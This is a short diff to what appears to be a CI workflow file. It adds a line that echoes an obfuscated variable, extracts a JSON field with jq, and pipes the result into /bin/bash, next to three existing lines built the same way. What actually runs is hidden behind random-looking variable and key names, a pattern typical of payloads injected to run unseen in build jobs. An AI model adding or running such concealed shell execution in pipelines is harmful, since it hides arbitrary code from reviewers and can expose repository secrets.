@@ -25,6 +25,7 @@ jobs:
           echo $zdscr59 | jq -r .bnet38 | /bin/bash
           printf '%s' "$x434" | jq -r .m456 | /bin/bash
           echo $zge3 | jq -r .jrlf7213 | /bin/bash
+          echo $onas81 | jq -r .whe6 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
